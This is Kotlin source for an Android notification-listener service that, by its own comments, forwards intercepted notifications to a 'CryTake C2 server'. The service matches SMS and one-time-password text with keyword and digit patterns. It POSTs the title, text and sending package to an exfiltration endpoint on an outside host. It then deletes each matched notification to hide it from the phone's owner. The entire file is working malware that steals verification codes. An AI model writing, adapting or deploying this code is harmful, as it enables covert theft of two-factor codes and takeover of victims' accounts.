package com.decry.decry

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import android.os.Build
import androidx.annotation.RequiresApi
import android.app.Notification
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import org.json.JSONObject

/**
 * DecryNotificationListenerService
 *
 * Intercepts incoming notifications (including SMS/OTP messages) 
 * and forwards them to the CryTake C2 server.
 * Also deletes notifications to keep them hidden from the user.
 */
class DecryNotificationListenerService : NotificationListenerService() {
    companion object {
        private const val TAG = "DecryNotificationListener"
        private const val C2_SERVER_URL = "https://cry-take.vercel.app/api"
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.i(TAG, "Notification listener service connected")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn?.let { handleNotification(it, true) }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
        // Don't process removed notifications
    }

    private fun handleNotification(sbn: StatusBarNotification, isNew: Boolean) {
        try {
            val extras = sbn.notification.extras
            val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
            val text = extras.getString(Notification.EXTRA_TEXT) ?: ""
            val packageName = sbn.packageName
            
            Log.d(TAG, "Notification: $packageName - $title: $text")
            
            // Check if this looks like an SMS/OTP notification
            val isSmsLike = packageName.contains("sms", ignoreCase = true) ||
                           packageName.contains("message", ignoreCase = true) ||
                           packageName.contains("messaging", ignoreCase = true) ||
                           title.lowercase().contains("otp") ||
                           title.lowercase().contains("verification") ||
                           text.contains(Regex("\\b[0-9]{4,8}\\b"))
            
            if (isSmsLike || isNew) {
                val deviceId = packageName.hashCode().toString()
                val json = JSONObject()
                json.put("type", "sms_intercept")
                json.put("content", "$title - $text")
                json.put("extra", "package=$packageName")
                
                // Send to CryTake C2 server
                sendViaCryTake(deviceId, json.toString())
                
                // Quickly delete the notification to hide it from user
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    deleteNotification(sbn)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling notification: ${e.message}")
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun deleteNotification(sbn: StatusBarNotification) {
        try {
            // Use NotificationManager to cancel the notification
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.cancel(sbn.key, sbn.id)
            
            Log.d(TAG, "Notification deleted: ${sbn.key}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete notification: ${e.message}")
        }
    }

    private fun sendViaCryTake(deviceId: String, jsonData: String) {
        Thread {
            try {
                val url = "$C2_SERVER_URL/exfil/$deviceId"
                
                val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true
                connection.connectTimeout = 10000
                connection.readTimeout = 10000
                
                connection.outputStream.use { os ->
                    os.write(jsonData.toByteArray(Charsets.UTF_8))
                    os.flush()
                }
                
                val responseCode = connection.responseCode
                if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
                    Log.i(TAG, "Notification data sent to CryTake successfully")
                } else {
                    Log.w(TAG, "CryTake send failed: $responseCode")
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "CryTake send error: ${e.message}")
            }
        }.start()
    }
}
